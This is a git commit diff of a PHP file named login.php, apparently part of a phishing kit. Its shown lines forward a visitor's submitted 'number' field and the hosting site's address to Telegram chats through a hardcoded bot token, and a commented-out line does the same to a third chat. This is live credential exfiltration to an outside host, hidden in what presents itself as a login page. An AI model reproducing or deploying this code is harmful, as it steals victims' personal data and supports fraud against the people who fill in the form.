b77c67e0e0214f41590b6105859042e79f61629f
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-17 14:29:48 +0000

    Create login.php

--- login.php
+++ login.php
@@ -1,6 +1,7 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_POST['number']);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001396771144&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
-$_POST['number'] = NULL;
+
+//$_POST['number'] += 1;
 
 // with them
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_POST['number']);
